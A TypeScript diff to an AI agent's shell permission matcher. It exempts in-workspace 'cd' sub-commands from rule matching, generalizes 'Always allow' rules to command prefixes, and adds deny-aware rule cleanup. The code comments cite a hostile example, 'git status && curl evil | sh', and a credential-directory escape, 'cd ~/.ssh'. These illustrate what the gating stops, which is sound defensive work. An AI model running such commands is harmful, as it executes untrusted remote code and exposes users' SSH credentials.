@@ -296,27 +296,53 @@ function matchClosingParen(s: string, open: number): number {
   return -1
 }
 
+/** Directory-change builtins whose only effect is the cwd — never worth a rule. */
+const CWD_BUILTINS = new Set(['cd', 'pushd', 'popd'])
+
+/** Whether a sub-command is a bare directory change (`cd`/`pushd`/`popd`). */
+function isCwdOnly(command: string): boolean {
+  const first = tokenizeShellCommand(command)[0]
+  return first !== undefined && CWD_BUILTINS.has(first)
+}
+
 /**
  * Resolve permission rules for a `run_shell` call across ALL its chained
- * sub-commands. An `allow` verdict is returned only when EVERY sub-command is
+ * sub-commands. An `allow` verdict is returned only when EVERY (gated) sub-command is
  * explicitly allowed; any denied sub-command denies the whole call; otherwise the
  * verdict is `ask` (a sub-command asked) or null (fall through to the policy,
  * which prompts for shell). This stops a narrow allow-rule (e.g. `git status*`)
  * from auto-approving `git status && curl evil | sh`.
+ *
+ * A pure `cd`/`pushd`/`popd` sub-command *into the workspace* carries no privilege of
+ * its own — a fresh shell resets the cwd on the next call — so an *unmatched* one does
+ * not block auto-approval. That lets a generalized rule like `npm install` cover the
+ * whole of `cd /repo && npm install` without also needing a rule for the `cd` (agents
+ * prepend one constantly). A `cd` that ESCAPES the workspace is NOT skipped: it stays
+ * gated so `cd ~/.ssh && <allowed-cmd>` still prompts rather than slipping past the
+ * workspace-escape tripwire on the strength of the allowed command alone. A command
+ * that is ONLY directory changes still falls through to the policy; an explicit deny
+ * on the `cd` still denies.
  */
 export function matchShellRule(
   rules: PermissionRule[],
-  command: string
+  command: string,
+  roots: string[] = []
 ): PermissionRule['action'] | null {
   let allAllow = true
   let anyAsk = false
+  let sawGated = false
   for (const seg of splitShellCommand(command)) {
-    const action = matchOneShell(rules, normalizeShellCommand(seg))
+    const norm = normalizeShellCommand(seg)
+    const action = matchOneShell(rules, norm)
     if (action === 'deny') return 'deny' // a denied sub-command denies the whole call
+    // A bare cd that stays inside the workspace is plumbing, not a gated command.
+    if (action == null && isCwdOnly(norm) && !shellReferencesExternalPath(norm, roots)) continue
+    sawGated = true
     if (action === 'allow') continue
     if (action === 'ask') anyAsk = true
     allAllow = false // 'ask' or unmatched — not auto-approvable
   }
+  if (!sawGated) return null // only directory changes — let the policy decide
   if (allAllow) return 'allow'
   return anyAsk ? 'ask' : null
 }
@@ -330,9 +356,111 @@ export function matchShellRule(
 export function matchRule(
   rules: PermissionRule[] | undefined,
   toolName: string,
-  subject: string
+  subject: string,
+  roots: string[] = []
 ): PermissionRule['action'] | null {
   if (!rules?.length) return null
-  if (toolName === 'run_shell') return matchShellRule(rules, subject)
+  if (toolName === 'run_shell') return matchShellRule(rules, subject, roots)
   return matchOne(rules, toolName, subject)
+}
+
+/** A leading `VAR=value` env-assignment token, which precedes the real program. */
+const ENV_ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/
+
+/** A bare sub-command verb like `status` or `install` — not a flag, path, or value. */
+const SUBCOMMAND_VERB = /^[a-z][a-z0-9:._-]*$/i
+
+/**
+ * The permission-rule pattern(s) to persist when the user picks "Always allow" on a
+ * `run_shell` call. Storing the exact command bakes in one-off arguments (and the
+ * `cd <dir> &&` prelude agents habitually prepend), so every near-identical command
+ * spawns its own rule and the Permissions panel fills with noise. Instead this returns
+ * a small set of generalized, per-sub-command prefixes:
+ *
+ * - The command is split into its chained sub-commands (the same split the matcher
+ *   uses), so `cd /repo && npm install foo` yields a rule for `npm install`, not the
+ *   whole line.
+ * - Pure directory-change sub-commands (`cd`/`pushd`/`popd`) are dropped — they carry
+ *   no privilege and only add noise.
+ * - A sub-command shaped `<program> <verb> …` where `<verb>` is a bare word (e.g.
+ *   `git status`, `npm install`) generalizes to that two-token prefix, so repeated
+ *   invocations with different trailing arguments collapse onto one rule.
+ * - Anything else — a lone program, a program whose next token is a flag/path, or an
+ *   env-prefixed command — is kept verbatim, so raw operations like `cat x` or
+ *   `rm -rf y` are NOT silently broadened to `cat`/`rm`.
+ *
+ * Used only for the ALLOW case; a deny is always stored exactly (a broadened deny is
+ * dangerous). Never returns an empty list.
+ */
+export function shellRulePatterns(command: string): string[] {
+  const patterns = new Set<string>()
+  for (const seg of splitShellCommand(command)) {
+    const norm = normalizeShellCommand(seg)
+    const tokens = tokenizeShellCommand(norm)
+    const prog = tokens[0]
+    if (!prog || CWD_BUILTINS.has(prog)) continue
+    const verb = tokens[1]
+    if (!ENV_ASSIGN.test(prog) && verb && SUBCOMMAND_VERB.test(verb)) {
+      patterns.add(`${prog} ${verb}`)
+    } else {
+      patterns.add(norm)
+    }
+  }
+  if (patterns.size === 0) patterns.add(normalizeShellCommand(command))
+  return [...patterns]
+}
+
+/**
+ * Whether the current `rules` already resolve `sample` (a command, path, URL, or query
+ * that a new rule would target) to ALLOW. Used to skip persisting a rule an existing,
+ * broader rule already covers, so "Always allow" never piles up redundant entries.
+ */
+export function alreadyAllowedAsRule(
+  rules: PermissionRule[],
+  toolName: string,
+  sample: string
+): boolean {
+  if (toolName === 'run_shell') return matchOneShell(rules, normalizeShellCommand(sample)) === 'allow'
+  return matchOne(rules, toolName, sample) === 'allow'
+}
+
+/**
+ * Rewrite a permission-rule list into an equivalent-but-tidier one, backing the
+ * Settings panel's "Clean up rules" action. It:
+ *
+ * - Re-runs each `run_shell` ALLOW rule through {@link shellRulePatterns}, collapsing a
+ *   pile of exact, `cd`-prefixed commands onto a handful of generalized prefixes —
+ *   EXCEPT a rule is left exactly as-is when any generalization of it would newly cover
+ *   an existing deny rule, so a narrower deny is never silently shadowed.
+ * - Drops any allow rule already covered by an earlier kept allow rule, and any exact
+ *   duplicate — preserving order, so first-match-wins semantics are unchanged.
+ *
+ * Deny/ask rules and non-shell rules are preserved verbatim (only exact dedupe
+ * applies). Pure and order-stable, so the caller can diff old vs new before saving.
+ */
+export function cleanupPermissionRules(rules: PermissionRule[]): PermissionRule[] {
+  const denies = rules.filter((r) => r.action === 'deny')
+  const wouldShadowDeny = (pattern: string): boolean =>
+    denies.some(
+      (d) => (!d.tool || d.tool === '*' || d.tool === 'run_shell') && shellCommandMatches(pattern, d.match ?? '')
+    )
+  const out: PermissionRule[] = []
+  const seen = new Set<string>()
+  const key = (r: PermissionRule): string => `${r.action} ${r.tool} ${r.match}`
+  for (const r of rules) {
+    let expanded: PermissionRule[] = [r]
+    if (r.action === 'allow' && r.tool === 'run_shell') {
+      const pats = shellRulePatterns(r.match ?? '')
+      // Keep the rule exact if generalizing it could shadow a narrower deny.
+      expanded = pats.some(wouldShadowDeny) ? [r] : pats.map((match) => ({ ...r, match }))
+    }
+    for (const e of expanded) {
+      if (seen.has(key(e))) continue
+      const priorAllows = out.filter((x) => x.action === 'allow')
+      if (e.action === 'allow' && alreadyAllowedAsRule(priorAllows, e.tool, e.match ?? '')) continue
+      seen.add(key(e))
+      out.push(e)
+    }
+  }
+  return out
 }
